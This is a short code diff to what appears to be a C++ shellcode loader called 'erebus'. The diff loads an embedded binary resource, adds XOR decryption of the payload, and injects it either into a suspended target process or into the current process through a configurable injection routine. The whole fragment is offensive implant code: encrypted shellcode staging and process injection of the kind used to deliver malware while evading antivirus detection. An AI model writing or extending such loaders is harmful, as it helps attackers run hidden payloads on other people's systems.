@@ -6,13 +6,20 @@ VOID entry(void)
 	erebus::config.injection_method = ExecuteShellcode;
 
 	HANDLE process_handle, thread_handle = INVALID_HANDLE_VALUE;
-	SIZE_T shellcode_size;
+	BYTE* shellcode = NULL;
+	SIZE_T shellcode_size = 0;
 
-	auto shellcode = erebus::StageResource(IDR_EREBUS_BIN1, L"EREBUS_BIN", &shellcode_size);
+	erebus::StageResource(IDR_EREBUS_BIN1, L"EREBUS_BIN", &shellcode, &shellcode_size);
 
+#if CONFIG_INJECTION_METHOD == 1
 	wchar_t cmdline[] = CONFIG_TARGET_PROCESS;
-
 	erebus::CreateProcessSuspended(cmdline, &process_handle, &thread_handle);
+#elif CONFIG_INJECTION_METHOD == 2
+	process_handle = NtCurrentProcess();
+	thread_handle = NtCurrentThread();
+#endif
+
+	erebus::DecryptionXOR(shellcode, shellcode_size, key, sizeof(key));
 
 	erebus::config.injection_method(shellcode, shellcode_size, process_handle, thread_handle);
 
